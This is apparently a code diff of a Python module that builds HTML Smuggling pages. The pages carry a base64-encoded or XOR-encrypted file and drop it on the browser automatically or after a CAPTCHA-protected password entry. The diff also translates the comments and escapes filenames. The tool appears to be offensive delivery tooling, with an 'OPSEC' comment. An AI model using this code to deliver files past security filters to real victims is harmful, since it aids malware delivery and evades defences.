@@ -1,22 +1,23 @@
 """
-HTML Smuggling - генерация HTML страниц для скачивания файлов.
+HTML Smuggling — generate HTML pages for file download delivery.
 """
 
 import base64
 import hashlib
+import json
 
 
 def xor_encrypt(data: bytes, password: str) -> bytes:
     """
-    XOR шифрование с ключом из SHA256 пароля.
+    XOR encryption using a SHA256-derived key.
 
-    ВНИМАНИЕ: Эта реализация намеренно отличается от security/crypto.py!
-    - security/crypto.py: XOR с raw паролем (для серверного шифрования/OPSEC)
-    - utils/smuggling.py: XOR с SHA256(password) (для HTML Smuggling / браузера)
+    NOTE: This implementation intentionally differs from security/crypto.py!
+    - security/crypto.py: XOR with raw password (for server-side OPSEC encryption)
+    - utils/smuggling.py: XOR with SHA256(password) (for HTML Smuggling / browser)
 
-    Браузерный JavaScript (CryptoJS.SHA256) использует SHA256-derived key,
-    поэтому серверная сторона HTML Smuggling должна делать то же самое.
-    Не объединяйте эти реализации — они обслуживают разные протоколы.
+    The browser-side JavaScript (CryptoJS.SHA256) uses a SHA256-derived key,
+    so the server-side HTML Smuggling must do the same.
+    Do NOT merge these implementations — they serve different protocols.
     """
     key = hashlib.sha256(password.encode('utf-8')).digest()
     key_len = len(key)
@@ -36,31 +37,32 @@ def generate_smuggling_html(
     crypto_js_src: str = "/static/crypto-js.min.js"
 ) -> str:
     """
-    Генерация HTML страницы для HTML Smuggling.
+    Generate an HTML page for HTML Smuggling file delivery.
 
     Args:
-        file_data: Содержимое файла
-        filename: Имя файла для скачивания
-        password: Пароль для XOR шифрования (None = без шифрования)
-        password_captcha: Base64 data URI капчи с паролем (опционально)
-        crypto_js_src: Путь к crypto-js (нужен только при шифровании)
+        file_data: File contents.
+        filename: Filename for the download.
+        password: Password for XOR encryption (None = no encryption).
+        password_captcha: Base64 data URI of a CAPTCHA image with the password (optional).
+        crypto_js_src: Path to crypto-js (only needed with encryption).
 
     Returns:
-        HTML страница
+        HTML page string.
     """
     if password:
-        # Шифруем и кодируем в base64
+        # Encrypt and encode to base64
         encrypted = xor_encrypt(file_data, password)
         data_b64 = base64.b64encode(encrypted).decode('utf-8')
         return _create_html_with_password(data_b64, filename, crypto_js_src, password_captcha, password)
     else:
-        # Просто base64
+        # Plain base64
         data_b64 = base64.b64encode(file_data).decode('utf-8')
         return _create_html_no_password(data_b64, filename)
 
 
 def _create_html_no_password(base64_data: str, filename: str) -> str:
-    """HTML без пароля - автоматическое скачивание."""
+    """HTML without password — automatic download."""
+    safe_fn = json.dumps(filename)[1:-1]
     return f'''<!DOCTYPE html>
 <html>
 <head>
@@ -76,7 +78,7 @@ h2{{color:#00d4ff}}
 <h2>Downloading...</h2>
 <div class="status" id="s">Preparing file...</div>
 <script>
-var fn="{filename}";
+var fn="{safe_fn}";
 var data="{base64_data}";
 function d(){{
 try{{
@@ -93,7 +95,7 @@ document.body.appendChild(el);
 el.click();
 document.body.removeChild(el);
 window.URL.revokeObjectURL(url);
-document.getElementById("s").innerHTML="Done! File: <b>"+fn+"</b>";
+document.getElementById("s").textContent="Done! File: "+fn;
 }}catch(e){{document.getElementById("s").textContent="Error: "+e.message}}
 }}
 setTimeout(d,500);
@@ -109,8 +111,9 @@ def _create_html_with_password(
     captcha_img: str | None = None,
     password: str | None = None
 ) -> str:
-    """HTML с паролем - форма ввода пароля."""
-    # Блок с капчей (если есть)
+    """HTML with password — password input form."""
+    safe_fn = json.dumps(filename)[1:-1]
+    # CAPTCHA block (if provided)
     captcha_block = ""
     if captcha_img:
         captcha_block = f'''
@@ -119,7 +122,7 @@ def _create_html_with_password(
 <img src="{captcha_img}" alt="Password" class="captcha-img" draggable="false" oncontextmenu="return false;">
 </div>'''
 
-    # Встроенная реализация SHA256 (без внешних зависимостей)
+    # Inline SHA256 implementation (no external dependencies)
     return f'''<!DOCTYPE html>
 <html>
 <head>
@@ -149,7 +152,7 @@ button:hover{{background:#00b8e6}}
 <div class="msg" id="m"></div>
 <script src="/static/crypto-js.min.js"></script>
 <script>
-var fn="{filename}";
+var fn="{safe_fn}";
 var encData="{encrypted_data}";
 function d(){{
 var pw=document.getElementById("p").value;
